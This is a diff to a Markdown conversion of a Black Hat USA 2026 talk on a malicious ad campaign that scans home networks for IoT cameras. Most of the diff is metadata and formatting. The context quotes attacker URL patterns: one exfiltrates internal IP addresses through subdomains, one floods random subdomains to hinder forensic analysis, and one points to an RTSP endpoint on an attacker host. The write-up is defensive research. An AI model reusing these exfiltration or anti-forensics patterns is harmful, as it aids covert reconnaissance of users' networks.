@@ -1,5 +1,5 @@
 ---
-title: "LANJack Turning Ads into IoT Recon Tools-WP"
+title: "LANJack Turning Ads into IoT Recon Tools"
 speakers: ["Moriya Pedael"]
 conference: "Black Hat"
 conference_full: "Black Hat USA 2026"
@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Moriya Pedael_LANJack Turning Ads into IoT Recon Tools-WP.pdf"
 pages: 59
 sha256: "ff2ed97cb594126f9e4b85339d2cf488b758e8937882da4ac8d600b8899e3aa0"
-text_chars: 88540
+text_chars: 88546
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-11T23:13:05Z"
+converted_at: "2026-08-12T05:39:05Z"
 ---
-# LANJack Turning Ads into IoT Recon Tools-WP
+# LANJack Turning Ads into IoT Recon Tools
 
 **Speakers:** Moriya Pedael  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Moriya Pedael_LANJack Turning Ads into IoT Recon Tools-WP.pdf` (59 pages)
+
 
 ## Slide 1
 
@@ -573,9 +578,9 @@ _Figure 34- Wireshark, The DNS record for the created iframe_
 
 When the created iframe receives the message (this time the script from `camScanner2.html` ), It creates an image request with the following pattern:
 
-```
+\```
 http://${int32_IP}.${uuidv4()}.control.vf-globallab.com/...
-```
+\```
 
 This request is used to exfiltrate the discovered internal IP address to the attacker.
 
@@ -725,9 +730,9 @@ In this stage, we show how the attack attempts to reduce visibility and forensic
 
 This stage generates a large volume of normal-looking DNS traffic to mask earlier attacker actions and reduce the chance of detection during analysis. Although this stage was not observed executing during the campaign, it was fully implemented in the code as a final “clean-up” stage. This phase floods the browser with requests to 5,000 randomly generated, non-existent subdomains of the legitimate domain `stackexchange.com` , each requesting a non-existent image resource. The requests follow the structure:
 
-```
+\```
 https://<random-number>gdf.stackexchange.com/img.jpg
-```
+\```
 
 The purpose is to pollute the DNS cache and obfuscate artifacts. By issuing a large volume of requests to random subdomains, the script could fill the browser’s DNS and network caches with unrelated entries, potentially reducing the visibility of earlier attacker-controlled domains and making forensic analysis more difficult. The use of a well-known legitimate domain further helps the requests appear benign in network telemetry.
 
@@ -783,9 +788,9 @@ Similar to the main campaign, the script first sends a loaded message to the par
 
 The script then changes the iframe location to an RTSP endpoint on port 8554:
 
-```
+\```
 rtsp://sadnesswithads.duckdns.org:8554/load3d?x=${window.id}
-```
+\```
 
 _Figure 55- The script changing the iframe location to the RTSP endpoint_
 
